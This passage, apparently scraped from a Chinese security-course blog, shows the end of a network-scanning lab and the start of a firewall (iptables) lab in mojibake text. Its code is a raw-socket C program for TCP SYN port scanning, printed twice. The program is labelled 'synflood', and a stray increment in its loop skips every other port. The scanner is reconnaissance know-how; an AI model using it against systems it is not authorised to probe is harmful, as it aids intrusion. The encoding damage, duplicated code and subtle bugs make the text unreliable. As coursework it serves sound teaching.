è®¾ç½®çš„è¾ƒä¸ºå¤æ‚ï¼Œä»¥åŠæ”»å‡»æœºçš„å­—å…¸è¿‡äºå¼±å°ï¼Œæ‰€ä»¥ä¸èƒ½å¤Ÿæš´åŠ›ç™»å…¥ftpæœåŠ¡å™¨ä¸­ 0x06 ç¼–ç¨‹å®ç° è¿™é‡Œå®ç°çš„æ˜¯TCP SYN æ‰«æ(å³åŠè¿æ¥æ‰«æ)\nè¿™é‡Œç”¨å¥—æ¥å­—socketçš„æ–¹æ³•æ¥å®ç°tcp SYN æ‰«æ\næ¥å®ç°æŸ¥çœ‹é¶æœºç«¯å£çš„å¼€æ”¾æƒ…å†µï¼Œä¾¿äºæ–¹ä¾¿ï¼Œè¿™é‡Œç«¯å£å³ä»1~1024ä¸ºæ­¢ã€‚ åªéœ€è¦æ„é€ å¥½ä¸€ä¸ªTCPåŒ…ï¼ŒæŒ‡å®šå¥½åŒ…ä¸­IP.flags=0x02(ä¸ºSYNåŒ…)ã€‚\næˆ‘ä»¬è¿™é‡Œåœ¨ubuntu 16 çš„ç¯å¢ƒä¸­ç¼–è¯‘æˆ‘ä»¬å†™å¥½çš„ç¨‹åº\næ‰§è¡Œç¨‹åº\nä¸æ­¤åŒæ—¶ï¼Œåˆ©ç”¨Wiresharkåœ¨é¶æœºè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æ”»å‡»æœºçš„éšæœºç«¯å£å‘é¶æœºçš„ç«¯å£ä»1-1024å‘é€SYNè¯·æ±‚ï¼Œç«¯å£å­˜åœ¨è¿”å›ACKåŒ…ï¼Œç«¯å£ä¸å­˜åœ¨è¿”å›RSTåŒ…ã€‚ æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d ç«¯å£å·²ç»æ¢æµ‹\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } 0x07 æ€»ç»“ æ˜æ™“ç½‘ç»œæ‰«æå™¨xscanã€nmapã€nessusç½‘ç»œæ‰«æè¿‡ç¨‹ä¸­ç”¨åˆ°çš„æ‰«ææ–¹æ³•ã€‚ ç½‘ç»œæ‰«æä¸‰ä¸ªè¿‡ç¨‹ ä¸»æœºæ‰«æ ç«¯å£æ‰«æ æ¼æ´åˆ†æ æ˜ç™½äº†TCP SYNã€ACKã€FINã€NULLã€Xmacã€Connect ç­‰æ‰«ææ–¹æ³•çš„åŸç†ã€‚ é€šè¿‡Xscanæ‰«æé¶æœºçš„FTP,é€šè¿‡WiresharkæŠ“åŒ…åˆ†ææ‰«æå™¨åˆ©ç”¨FTPå¼±å£ä»¤æ¼æ´çš„è¿‡ç¨‹ã€‚ é€šè¿‡ç¼–ç¨‹socket å®ç° TCP SYN æ‰«æï¼Œè¿›ä¸€æ­¥åŠ æ·±äº†å¯¹socketç¼–ç¨‹çš„ç†è§£ã€‚ ","permalink":"http://www.reus09.top/posts/tech/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/","summary":"ç½‘ç»œæ‰«æ 0x01 å®éªŒç›®çš„ ç”¨xscanã€nmapå’Œnessusè½¯ä»¶è¿›è¡Œä¸»æœºã€ç«¯å£ã€æ¼æ´æ‰«æå®éªŒï¼Œæ•è·æ‰«ææ—¶äº¤äº’çš„æ•°æ®åŒ…ï¼Œé€šè¿‡åˆ†ææ‰«ææ•°æ®åŒ…ï¼ŒéªŒè¯æ‰«æ","title":"ç½‘ç»œæ‰«æ"},{"content":"é˜²ç«å¢™å®éªŒ 0x01 å®éªŒç›®æ ‡ é€‰æ‹©ä¸€ç§ä¸»æµçš„è½¯ä»¶é˜²ç«å¢™ï¼Œç†Ÿæ‚‰å…¶å®‰å…¨è§„åˆ™é…ç½®ï¼Œé€šè¿‡é…ç½®é˜²ç«å¢™è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š\nè¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ®ã€‚ è¿‡æ»¤R-\u0026gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®ï¼ŒæŸ¥çœ‹ç°è±¡ã€‚ èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ®ã€‚ é…ç½®linuxç³»ç»Ÿä¸‹iptablesé˜²ç«å¢™ï¼›åœ¨linuxç³»ç»Ÿä¸‹ï¼Œé…ç½®iptablesé˜²ç«å¢™ï¼Œå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼š\nIptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢ã€‚ Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤ã€‚ è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼›ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰ å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœºï¼› å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœºã€‚ é€‰åšï¼šå®Œæˆä¸‹è¿°åŠŸèƒ½ï¼š\nç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ï¼› æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ®ï¼› 0x02 å®éªŒå‰æ å®éªŒå‰æçŸ¥è¯†\né˜²ç«å¢™å®šä¹‰ï¼š\né˜²ç«å¢™æ˜¯ä½äºä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰ç½‘ç»œé—´ï¼Œå®æ–½ç½‘é—´è®¿é—®æ§åˆ¶çš„ä¸€ç»„ç»„ä»¶çš„é›†åˆã€‚ é˜²ç«å¢™æ˜¯æŒ‡éš”ç¦»åœ¨å†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œä¹‹é—´çš„ä¸€é“é˜²å¾¡ç³»ç»Ÿï¼Œæ˜¯è¿™ä¸€ç±»é˜²èŒƒæªæ–½çš„æ€»ç§°ã€‚ é˜²ç«å¢™è®¾è®¡ç›®æ ‡ï¼š\nå†…éƒ¨å’Œå¤–éƒ¨ä¹‹é—´çš„æ‰€æœ‰ç½‘ç»œæ•°æ®æµå¿…é¡»ç»è¿‡é˜²ç«å¢™ã€‚ åªæœ‰ç¬¦åˆå®‰å…¨ç­–ç•¥çš„æ•°æ®æµï¼Œå³ï¼Œç»è¿‡æˆæƒçš„æ•°æ®æµæ‰èƒ½é€šè¿‡é˜²ç«å¢™ã€‚ é˜²ç«å¢™è‡ªèº«ä¸èƒ½è¢«æ”»ç ´ã€‚ é˜²ç«å¢™ç»å…¸éƒ¨ç½²\né˜²ç«å¢™åŠŸèƒ½æ¨¡å—\né˜²ç«å¢™ç±»å‹\nåŒ…è¿‡æ»¤é˜²ç«å¢™ åŒ…è¿‡æ»¤é˜²ç«å¢™ç”¨è§„åˆ™æ£€æµ‹æ¯ä¸ªIPåŒ…ï¼Œæ ¹æ®ç»“æœæ”¾è¡Œæˆ–ä¸¢å¼ƒè¿™äº›æ•°æ®åŒ…ã€‚ åŒ…è¿‡æ»¤é˜²ç«å¢™ä¸€èˆ¬ä¼šé…ç½®ä¸ºåŒå‘è¿‡æ»¤ï¼Œå³é’ˆå¯¹è¿›å…¥å†…éƒ¨ç½‘ç»œå’Œç¦»å¼€å†…éƒ¨ç½‘ç»œä¸¤ä¸ªæ–¹å‘çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ã€‚ è¿‡æ»¤è§„åˆ™åŸºäºæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š æºã€ç›®IPåœ°å€ï¼Œ æºã€ç›®ç«¯å£ï¼Œä¾‹å¦‚ï¼šFTP(21)ã€ HTTP(80) ã€DNS(53)â€¦ åè®®ç±»å‹ï¼Œä¾‹å¦‚ï¼šTCPã€ UDPã€ ICMP ã€IGMPâ€¦ çŠ¶æ€æ£€æŸ¥é˜²ç«å¢™ è¿‡æ»¤è§„åˆ™åŸºäºæ•°æ®åŒ…ä¸­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š ç½‘ç»œæ¥å£ï¼Œä¾‹å¦‚ï¼šeth0ç”¨äºå…¥ç«™ï¼Œeth1ç”¨äºå‡ºç«™â€¦ IPé€‰é¡¹ï¼Œä¾‹å¦‚ï¼šæºè·¯ç”±ã€è®°å½•è·¯ç”±â€¦ TCPé€‰é¡¹ï¼Œä¾‹å¦‚ï¼šSYN ã€ACKã€ FIN ã€RSTâ€¦ æ•°æ®åŒ…æµå‘ï¼Œä¾‹å¦‚ï¼šå…¥ç«™ï¼ˆinï¼‰æˆ–å‡ºç«™ï¼ˆoutï¼‰ ç”µè·¯çº§ä»£ç†é˜²ç«å¢™ æ˜¯ä¸€ä¸ªé€šç”¨ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒå·¥ä½œäºOSIäº’è”æ¨¡å‹çš„ä¼šè¯å±‚æˆ–æ˜¯TCP/IPåè®®çš„TCPå±‚ã€‚ å®ƒé€‚ç”¨äºå¤šä¸ªåè®®ï¼Œä½†å®ƒä¸èƒ½è¯†åˆ«åœ¨åŒä¸€ä¸ªåè®®æ ˆä¸Šè¿è¡Œçš„ä¸åŒçš„åº”ç”¨ï¼Œå½“ç„¶ä¹Ÿå°±ä¸éœ€è¦å¯¹ä¸åŒçš„åº”ç”¨è®¾ç½®ä¸åŒçš„ä»£ç†æ¨¡å—ï¼Œä½†è¿™ç§ä»£ç†éœ€è¦å¯¹å®¢æˆ·ç«¯ä½œé€‚å½“ä¿®æ”¹ã€‚ å®ƒæ¥å—å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ï¼Œä»£ç†å®¢æˆ·ç«¯å®Œæˆç½‘ç»œè¿æ¥ï¼Œå»ºç«‹èµ·ä¸€ä¸ªå›è·¯ï¼Œå¯¹æ•°æ®åŒ…èµ·è½¬å‘ä½œç”¨ï¼Œæ•°æ®åŒ…è¢«æäº¤ç»™ç”¨æˆ·çš„åº”ç”¨å±‚æ¥å¤„ç†ã€‚ é€šè¿‡ç”µè·¯çº§ç½‘å…³ä¼ é€’çš„æ•°æ®ä¼¼ä¹èµ·æºäºé˜²ç«å¢™ï¼Œéšè—äº†è¢«ä¿æŠ¤ç½‘ç»œçš„ä¿¡æ¯ã€‚ åº”ç”¨å±‚ä»£ç†é˜²ç«å¢™ é¦–å…ˆï¼Œå®ƒå¯¹è¯¥ç”¨æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯ã€‚ è‹¥ä¸ºåˆæ³•ç”¨æˆ·ï¼Œåˆ™æŠŠè¯·æ±‚è½¬å‘ç»™çœŸæ­£çš„æŸä¸ªå†…éƒ¨ç½‘ç»œçš„ä¸»æœºï¼ŒåŒæ—¶ç›‘æ§ç”¨æˆ·çš„æ“ä½œï¼Œæ‹’ç»ä¸åˆæ³•çš„è®¿é—®ã€‚ å½“å†…éƒ¨ç½‘ç»œå‘å¤–éƒ¨ç½‘ç»œç”³è¯·æœåŠ¡æ—¶ï¼Œä»£ç†æœåŠ¡å™¨çš„å·¥ä½œè¿‡ç¨‹åˆšå¥½ç›¸åã€‚ å®éªŒç¯å¢ƒ\nFTPæœåŠ¡å™¨ windows xp IP:192.168.195.162 FTPå®¢æˆ·ç«¯ ä»¥åŠ Windowsé˜²ç«å¢™ Windows xp IP:192.168.195.131 Linux é˜²ç«å¢™ Centos 7: 192.168.195.174 å®éªŒå·¥å…·\nå‘é€tcpåŒ…åˆ°ç›®çš„æœºéšæœºç«¯å£çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP å¤´éƒ¨ struct tcphdr tcp; //TCP å¤´éƒ¨ struct pseudohdr pseudo; //TCP ä¼ªå¤´éƒ¨ //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯ init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //è®¡ç®—IPæ ¡éªŒå’Œ ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // è®¡ç®—TCPæ ¡éªŒå’Œ bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // å¤åˆ¶TCPä¼ªå¤´éƒ¨ memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // å¤åˆ¶TCPå¤´éƒ¨ tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // åˆ›å»ºä¸€ä¸ªåŸå§‹å¥—æ¥å­—, æŒ‡å®šå…¶å…³æ³¨TCPåè®® fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // è®¾ç½®éœ€è¦æ‰‹åŠ¨æ„å»ºIPå¤´éƒ¨ if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d ç«¯å£å·²ç»æ¢æµ‹\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } å‘é€tcpåŒ…åˆ°ç›®çš„æœºç¡®å®šç«¯å£çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip æŠ¥å¤´ struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ 